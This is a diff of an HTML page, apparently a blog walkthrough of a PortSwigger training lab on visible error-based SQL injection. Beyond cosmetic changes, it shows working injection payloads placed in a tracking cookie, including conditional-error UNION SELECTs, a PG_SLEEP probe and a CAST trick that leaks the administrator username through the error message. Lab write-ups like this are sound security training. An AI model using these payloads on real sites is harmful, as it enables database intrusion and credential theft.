@@ -7,41 +7,38 @@
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="Walkthrough of the already mentioned WSA lab by PortSwigger" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
-<div id="org-div-home-and-up">
- <a accesskey="h" href="./index.html"> UP </a>
- |
- <a accesskey="H" href="/index.html"> HOME </a>
-</div><div id="content" class="content">
+<div id="preamble" class="status">
+<div id="org-div-home-and-up"><a accesskey="H" href="/index.html"> HOME </a> | <button id="theme-toggle" title="Toggle theme">🌓</button></div>
+</div>
+<div id="content" class="content">
 <h1 class="title">WSA: Visible Error-Based SQLi</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org098b861">Introduction</a></li>
-<li><a href="#org5fcab4a">Getting in position</a>
+<li><a href="#org0f25a84">Introduction</a></li>
+<li><a href="#org61ea6e9">Getting in position</a>
 <ul>
-<li><a href="#orgac6c5c0">SQL Injection Point</a></li>
-<li><a href="#orgb37e7de">DBMS enumeration</a></li>
+<li><a href="#org1dd25d3">SQL Injection Point</a></li>
+<li><a href="#org3835468">DBMS enumeration</a></li>
 </ul>
 </li>
-<li><a href="#org8507b2e">He protec he atac he gets the data bac</a>
+<li><a href="#orgb30a134">He protec he atac he gets the data bac</a>
 <ul>
-<li><a href="#org91c0a25">Trying some stuff out</a></li>
-<li><a href="#org3fbbcc1">Searching for shorter payloads</a></li>
+<li><a href="#org2a0d27d">Trying some stuff out</a></li>
+<li><a href="#orgca9e1e3">Searching for shorter payloads</a></li>
 </ul>
 </li>
-<li><a href="#org1224a4a">Summary</a></li>
+<li><a href="#org41ecdc1">Summary</a></li>
 </ul>
 </div>
 </div>
-
-
-<div id="outline-container-org098b861" class="outline-2">
-<h2 id="org098b861"><a href="#org098b861">Introduction</a></h2>
-<div class="outline-text-2" id="text-org098b861">
+<div id="outline-container-org0f25a84" class="outline-2">
+<h2 id="org0f25a84"><a href="#org0f25a84">Introduction</a></h2>
+<div class="outline-text-2" id="text-org0f25a84">
 <p>
 We are given this task:
 </p>
@@ -59,14 +56,13 @@ basic information.
 </p>
 </div>
 </div>
-
-<div id="outline-container-org5fcab4a" class="outline-2">
-<h2 id="org5fcab4a"><a href="#org5fcab4a">Getting in position</a></h2>
-<div class="outline-text-2" id="text-org5fcab4a">
+<div id="outline-container-org61ea6e9" class="outline-2">
+<h2 id="org61ea6e9"><a href="#org61ea6e9">Getting in position</a></h2>
+<div class="outline-text-2" id="text-org61ea6e9">
 </div>
-<div id="outline-container-orgac6c5c0" class="outline-3">
-<h3 id="orgac6c5c0"><a href="#orgac6c5c0">SQL Injection Point</a></h3>
-<div class="outline-text-3" id="text-orgac6c5c0">
+<div id="outline-container-org1dd25d3" class="outline-3">
+<h3 id="org1dd25d3"><a href="#org1dd25d3">SQL Injection Point</a></h3>
+<div class="outline-text-3" id="text-org1dd25d3">
 <p>
 It is trivial, once again, to see that modifying the value of the
 cookie results in an error code, thus signaling that the cookie&rsquo;s
@@ -74,7 +70,7 @@ value is the point our payload should be inserted at.
 </p>
 
 
-<div id="orgea37fe2" class="figure">
+<div id="org14e2cd7" class="figure">
 <p><img src="images/Getting_in_position/20240214_221538_screenshot.png" alt="20240214_221538_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>SQL error through injection in the cookie field</p>
@@ -85,7 +81,7 @@ By taking a better look at that response, however, we see that it
 gives us some more information regarding the error that was produced:
 </p>
 
-<pre class="example" id="org6f42a33">
+<pre class="example" id="orgf8678d2">
 &lt;h4&gt;Unterminated string literal started at position 57 in SQL SELECT * FROM tracking WHERE id = 'TwPUGarplaH8g4da' test'. Expected  char&lt;/h4&gt;
 &lt;p class=is-warning&gt;Unterminated string literal started at position 57 in SQL SELECT * FROM tracking WHERE id = 'TwPUGarplaH8g4da' test'. Expected  char&lt;/p&gt;
 </pre>
@@ -96,10 +92,9 @@ example, might somehow be exploited.
 </p>
 </div>
 </div>
-
-<div id="outline-container-orgb37e7de" class="outline-3">
-<h3 id="orgb37e7de"><a href="#orgb37e7de">DBMS enumeration</a></h3>
-<div class="outline-text-3" id="text-orgb37e7de">
+<div id="outline-container-org3835468" class="outline-3">
+<h3 id="org3835468"><a href="#org3835468">DBMS enumeration</a></h3>
+<div class="outline-text-3" id="text-org3835468">
 <p>
 Trying a <code>SELECT null</code> statement in our payload, without a <code>FROM</code> part,
 resulted in <code>200 OK</code>, which means that our target DBMS surely is not
@@ -108,17 +103,16 @@ Oracle.
 </div>
 </div>
 </div>
-
-<div id="outline-container-org8507b2e" class="outline-2">
-<h2 id="org8507b2e"><a href="#org8507b2e">He protec he atac he gets the data bac</a></h2>
-<div class="outline-text-2" id="text-org8507b2e">
+<div id="outline-container-orgb30a134" class="outline-2">
+<h2 id="orgb30a134"><a href="#orgb30a134">He protec he atac he gets the data bac</a></h2>
+<div class="outline-text-2" id="text-orgb30a134">
 <p>
 After that, we just have to see what to do there. Having completed the
 blind version of that room some days before (or was it just
 yesterday), I went ahead and dug the following payload from my notes:
 </p>
 
-<pre class="example" id="org1fa0730">
+<pre class="example" id="orge95ca5f">
 UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
 </pre>
 
@@ -127,7 +121,7 @@ It needs to be properly tinkered with, to match with our DBMS, but
 that is not so difficult. Using the Burp SQLi cheatsheet once again:
 </p>
 
-<pre class="example" id="orge8bed1f">
+<pre class="example" id="org1a8ab70">
 UNION SELECT CASE WHEN ('b'='a') THEN 1/0 ELSE null END--  
 UNION SELECT CASE WHEN ('b'='a') THEN 1/(SELECT 0) ELSE null END--  
 UNION SELECT IF('b'='a',1/0,null)--
@@ -147,7 +141,7 @@ problem was obvious: The input string gets truncated.
 </p>
 
 
-<div id="org2d885ed" class="figure">
+<div id="orgf5ba667" class="figure">
 <p><img src="images/He_protec_he_atac_he_gets_the_data_bac/20240214_223053_screenshot.png" alt="20240214_223053_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Truncation POC</p>
@@ -161,10 +155,9 @@ change. The string is too long to be accepted. I need to use shorter
 payloads <b>or</b> find a way to overcome that truncation.
 </p>
 </div>
-
-<div id="outline-container-org91c0a25" class="outline-3">
-<h3 id="org91c0a25"><a href="#org91c0a25">Trying some stuff out</a></h3>
-<div class="outline-text-3" id="text-org91c0a25">
+<div id="outline-container-org2a0d27d" class="outline-3">
+<h3 id="org2a0d27d"><a href="#org2a0d27d">Trying some stuff out</a></h3>
+<div class="outline-text-3" id="text-org2a0d27d">
 <p>
 To get a better understanding of the tools in our hands, I started
 testing payloads, so that I get more information from the visible
@@ -174,15 +167,14 @@ gets recognized, even though it does not run due to the wrong syntax)
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sql" id="orgab36420">TrackingId=TwPUGarplaH8g4da<span class="org-string">' UNION SELECT PG_SLEEP(1)--;</span>
+<pre class="src src-sql" id="org422fc0a">TrackingId=TwPUGarplaH8g4da<span class="org-string">' UNION SELECT PG_SLEEP(1)--;</span>
 </pre>
 </div>
 </div>
 </div>
-
-<div id="outline-container-org3fbbcc1" class="outline-3">
-<h3 id="org3fbbcc1"><a href="#org3fbbcc1">Searching for shorter payloads</a></h3>
-<div class="outline-text-3" id="text-org3fbbcc1">
+<div id="outline-container-orgca9e1e3" class="outline-3">
+<h3 id="orgca9e1e3"><a href="#orgca9e1e3">Searching for shorter payloads</a></h3>
+<div class="outline-text-3" id="text-orgca9e1e3">
 <p>
 Heading back to the cheatsheet it has a nice suggestion for exploiting
 visible errors, using typecasting.
@@ -192,14 +184,14 @@ visible errors, using typecasting.
 I already know where to look at so:
 </p>
 <div class="org-src-container">
-<pre class="src src-sql" id="org3ff8176">TrackingId=<span class="org-string">' AND CAST((SELECT username from users limit 1)as int)&lt;0--</span>
+<pre class="src src-sql" id="org9c0b911">TrackingId=<span class="org-string">' AND CAST((SELECT username from users limit 1)as int)&lt;0--</span>
 </pre>
 </div>
 
 <p>
 returns
 </p>
-<pre class="example" id="orge9b1749">
+<pre class="example" id="org4a8a112">
 ERROR: invalid input syntax for type integer: "administrator"
 </pre>
 
@@ -211,10 +203,9 @@ password directly in the response (visible error)!
 </div>
 </div>
 </div>
-
-<div id="outline-container-org1224a4a" class="outline-2">
-<h2 id="org1224a4a"><a href="#org1224a4a">Summary</a></h2>
-<div class="outline-text-2" id="text-org1224a4a">
+<div id="outline-container-org41ecdc1" class="outline-2">
+<h2 id="org41ecdc1"><a href="#org41ecdc1">Summary</a></h2>
+<div class="outline-text-2" id="text-org41ecdc1">
 <p>
 The way I decided to initially tackle the lab was problematic. Was not
 my input length limited, it could have worked, but it would have been
